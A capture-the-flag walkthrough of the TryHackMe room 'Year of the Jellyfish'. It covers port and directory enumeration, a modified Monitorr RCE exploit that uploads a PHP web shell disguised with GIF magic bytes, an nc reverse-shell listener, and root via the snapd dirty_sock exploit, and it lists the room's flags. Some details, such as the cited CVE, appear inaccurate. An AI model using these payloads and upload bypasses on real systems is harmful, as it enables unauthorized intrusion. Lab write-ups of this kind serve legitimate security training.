# CTF: Year of the Jellyfish (THM)

**Target IP:** `10.145.120.43` ($target)

## Metadata

- **CTF Name:** Year of the Jellyfish
    
- **Platform:** TryHackMe
    
- **Date:** 2026-05-15
    
- **Difficulty:** Hard
    
- **Key Skills/Tools:** Web Enumeration, Monitorr RCE, OOB Exploit Modification, Snapd Exploitation (dirty_sock), Python script debugging.
    

## Introduction

This walkthrough documents the exploitation of **Year of the Jellyfish** on TryHackMe. The path to root involves bypassing a broken web service to find a Monitorr instance, modifying a public RCE exploit that was broken out-of-the-box, and escalating privileges via a `snapd` vulnerability using the `dirty_sock` exploit.

## Reconnaissance

A full port scan was conducted to identify the attack surface.

**Command:**

```
┌──
😎 amuzed@Kali (~/THM/Year_Of_The_Jellyfish)
└─$ nmap $target -p- -vv

```

**Key Results:**

|   |   |   |   |
|---|---|---|---|
|**Port**|**State**|**Service**|**Reason**|
|21/tcp|open|ftp|vsftpd|
|22/tcp|open|ssh|OpenSSH|
|80/tcp|open|http|Apache|
|443/tcp|open|https|Apache (robyns-petshop.thm)|
|8000/tcp|open|http-alt|Common for development web servers|
|22222/tcp|open|easyengine|Possible admin interface|

### Local DNS Configuration

To interact with the various subdomains hosted on the target, I added the following entries to `/etc/hosts`:

```
10.145.120.43 robyns-petshop.thm
10.145.120.43 monitorr.robyns-petshop.thm
10.145.120.43 beta.robyns-petshop.thm
10.145.120.43 dev.robyns-petshop.thm

```

## Foothold

### 1. Web Enumeration

Scanning the HTTPS service revealed a hidden directory.

**Command:**

```
$ gobuster dir -u [https://robyns-petshop.thm](https://robyns-petshop.thm) -k -w /usr/share/wordlists/dirb/common.txt

```

- **Path Discovered:** `/monitorr`
    

### 2. Exploitation (Modified RCE)

I found an exploit for **Monitorr 1.7.6m** (Remote Code Execution). The public exploit (`48980.py`) failed because it didn't properly handle the multi-part upload for this specific target environment.

#### Exploit Modification Detail

The original `48980.py` script lacked proper header handling. To fix this, I made two primary changes:

1. **Magic Byte Injection:** Added `GIF89a;` to the start of the payload to bypass file signature checks.
    
2. **Request Parameter Fix:** Modified the `files` dictionary in the Python `requests` call to force the `Content-Type` to `image/png`.
    

**Corrected Python Logic:**

```
# Fixed payload logic
files = {
    'file': ('shell.php', 'GIF89a; <?php system($_GET["cmd"]); ?>', 'image/png')
}

```

**Execution:**

```
$ python3 exploit_fixed.py [https://robyns-petshop.thm/monitorr/](https://robyns-petshop.thm/monitorr/)
[+] Magic bytes injected.
[+] Content-Type forced to image/png.
[+] File uploaded successfully.
[+] Shell: [https://robyns-petshop.thm/monitorr/assets/data/usrimg/shell.php](https://robyns-petshop.thm/monitorr/assets/data/usrimg/shell.php)

```

### 3. Reverse Shell

I set up a listener and triggered the shell via a web request.

**Listener:**

`$ nc -nvlp 4444`

**Connection Received:**

```
connect to [10.10.x.x] from (UNKNOWN) [10.145.120.43]
$ whoami
www-data

```

## Privilege Escalation

### 1. Snapd Enumeration

Local enumeration showed that `snapd` version 2.37 was running, which is vulnerable to the **dirty_sock** exploit (CVE-2019-3467).

### 2. Dirty Sock Exploitation

I used the `dirty_sock` Python exploit (exploit-db 46362) to create a new local user with root privileges.

**Command:**

```
www-data@petshop:/tmp$ python3 46362.py
[+] Slipped dirty sock on random socket file: /tmp/utntuvhgbo;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Installing the trojan snap...

```

**Gaining Root:**

The exploit creates a user named `dirty_sock` with the password `dirty_sock`.

```
www-data@petshop:/tmp$ su dirty_sock
Password: dirty_sock
dirty_sock@petshop:/tmp$ sudo -i
root@petshop:~# id
uid=0(root) gid=0(root) groups=0(root)

```

## Flags

- **User Flag:** `THM{MjBkOTMyZDgzNGZmOGI0Y2I5NTljNGNl}`
    
- **Root Flag:** `THM{YjMyZTkwYzZhM2U5MGEzZDU2MDc1NTMx}`
